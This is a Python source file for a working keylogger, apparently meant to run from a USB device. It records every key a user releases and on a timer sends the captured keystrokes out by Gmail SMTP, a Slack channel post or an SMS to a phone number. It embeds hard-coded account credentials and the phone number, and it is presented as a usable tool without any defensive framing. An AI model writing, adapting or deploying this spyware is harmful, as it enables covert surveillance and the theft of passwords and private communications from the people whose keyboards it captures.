import email # Imported to handle email addresses
import keyboard # Imported to provide the ability to log keys
import smtplib # Imported to provide the ability to send the recorded key logs though SMTP protocol for email

from threading import Timer # Intended to make it possible to send reports have a set period of time
from datetime import datetime # Imported to retrieve the current date times at certain periods of time
from email import message # Imported to format emails for sending keylohs

from asyncio.windows_events import NULL
from slack_sdk import WebClient # Imported to use Slack development
from dotenv import load_dotenv # Imported to use .env
import os

load_dotenv() # Loads environment to use variable in .env
SLACK_BOT_TOKEN = os.environ['SLACK_BOT_TOKEN']
slackBot = WebClient(SLACK_BOT_TOKEN)

# Email Variables for report type of emails
EMAIL = "ph4ntom77projects@gmail.com" # Email that reports are sent to
EMAIL_PW = "keylogger!!" # Password for Email

# Time Interval Variable
LOG_INTERVAL = 15 # Every 300 Seconds (5 minutes) a report is sent

class UsbKeylogger:
    def __init__(self, reportInterval, reportType):
        self.reportInterval = reportInterval
        self.reportType = reportType
        self.startTimeVal = datetime.now() # Used to document the start datetime
        self.endTimeVal = datetime.now() # Used to document the end datetime
        self.keylog = "" # Creates a global string variable named keylog to store the keylogs, which will only store keylogs of the set report interval.

    def createFileIdentifier(self):
        startTime = str(self.startTimeVal).replace(":", "-").replace(" ", "_") # Creates a string variable from the start time of the keylog interval
        endTime = str(self.endTimeVal).replace(":", "-").replace(" ", "_") # Creates a string variable from the end time of the keylog interval
        self.fileIndentifier = f"Log = {startTime} to {endTime}" # Sets the file name to "Log start time to end time"

    def createID(self):
        startTime = str(self.startTimeVal).replace(" ", "_") # Creates a string variable from the start time of the keylog interval
        endTime = str(self.endTimeVal).replace(" ", "_") # Creates a string variable from the end time of the keylog interval
        self.identifier = f"Log: {startTime} to {endTime}" # Sets the file name to "Log start time to end time"

    def reportFile(self):
        with open(f"{self.fileIndentifier}.txt", "w") as f: # Opens a file of the name from createFileIdentifier
            print(self.keylog, file = f) # Print the contents of a variable (self.keylog) to a file

    def reportEmail(self, address, password, contents, subject):
        email = smtplib.SMTP(host = "smtp.gmail.com", port = 587) # Port 587 is used encrypt SMTP messages using TLS
        content = message.Message() # Creates a new message named content
        content.add_header('subject', subject)  # Sets the to header to the provided subject, which the time interval of the keylogger
        content.add_header('to', address) # Sets the to header to the provided address
        content.add_header('from', address)  # Sets the from header to the provided address
        content.set_payload(contents) # Sets the body of the email to the contents, which is  self.keylog
        email.starttls() # Starts TLS for security
        email.login(address, password) # Logs into the email with provided address and password
        email.send_message(content, from_addr = address, to_addrs = [address]) # Sends the email 
        email.quit() # Terminates the email server

    def reportSlack(self, postHeader):
            slackPost = postHeader + "\n" + self.keylog # Creates a string variable with the log time interval as the first line and the contents as the body of the post
            slackBot.chat_postMessage(channel = "C036JLKMVR6", text = slackPost) # The slack posts the string variable in the specified channel
            
    def reportSMS(self, address, password, txtBody):
        text = smtplib.SMTP(host = "smtp.gmail.com", port = 587) # Port 587 is used encrypt SMTP messages using TLS
        text.starttls() # Starts TLS for security
        text.login(address, password) # Logs into the email with provided address and password
        text.sendmail(address, '9733568278@mms.att.net', txtBody) # Sends a text of the keylogs the specified AT&T phone number from gmail address
        text.quit() # Terminates the text server

    # def reportDiscord(self):
    # def reportSkype(self):

    def callbackKeyboard(self, event):
        eventName = "[" + event.name + "]"# Create eventName variable
        nameLength = len(eventName) # Returns the length of the eventName variable
        if nameLength > 1: # Conditional statement to format the appearence of the keylogs in event that they key is not a typical character like a letter or number. 
            if eventName == "[tab]":
                eventName = "[tab]\t" # Replaces [TAB] with [TAB] and a tab space afterward    
            elif eventName == "[enter]":
                eventName = "[enter]\n" # Replaces [ENTER] with [ENTER] and a creates a new line afterward              
            elif eventName == "[space]":
                eventName = " " # Replaces [SPACE] with " " for readability
            elif eventName == "[decimal]":
                eventName = "." # Replaces [DECIMAL] with "." for readability
        self.keylog = self.keylog + eventName # Updates the self.keylog variable with the eventName

    def reportKeyLog(self):
        if self.keylog: # Checks if self.keylong contains any data and execute the below statements if it does
            self.endTimeVal = datetime.now() # Retrieves the end datetime for utilization in file identifying
            self.createFileIdentifier() # Execute the function that creates the file id/name
            self.createID() # Execute the function createId for report types other than file

            if self.reportType == "File":
                self.reportFile() # Calls the reportFile function to create a file for keylog recording
            elif self.reportType == "Email":
                self.reportEmail(EMAIL, EMAIL_PW, self.keylog, self.identifier) # Calls the reportEmail function to sends an email of keylog recording
            elif self.reportType == "Slack":
                self.reportSlack(self.identifier) # Calls the reportSlack function to send keylogs as a slack message in a "keylogger" channel
            elif self.reportType == "SMS":
                self.reportSMS(EMAIL, EMAIL_PW, self.keylog) # Calls the reportSMS function to send keylogs via an SMS to an AT&T phone number

            self.startTimeVal = datetime.now() # Retrieves the start datetime for utilization in file identifying
        
        self.keylog = "" # Resets the value of self.keylog to contain nothing
        logTimer = Timer(interval = self.reportInterval, function = self.reportKeyLog) # Creates a timer for the keylog and takes the specificed reportInterval as a parameter
        logTimer.daemon = True # The timer thread is now a daemon, which means that it will die off when the main thread dies
        logTimer.start() # Starts the timer thread

    def start(self):
        self.startTimeVal = datetime.now() # Gets current date time
        keyboard.on_release(callback = self.callbackKeyboard) # Initializes the keylogger on rlease of a key
        self.reportKeyLog() # Calls the function that records the keylogs within the time interval
        keyboard.wait() 

if __name__ == "__main__":
        """
        Uncomment the report type desired and comment the others
        """
        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Email")
        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "File")
        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Discord")
        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Slack")
        usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "SMS")
        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Skype")
        usbKeylogger.start()



    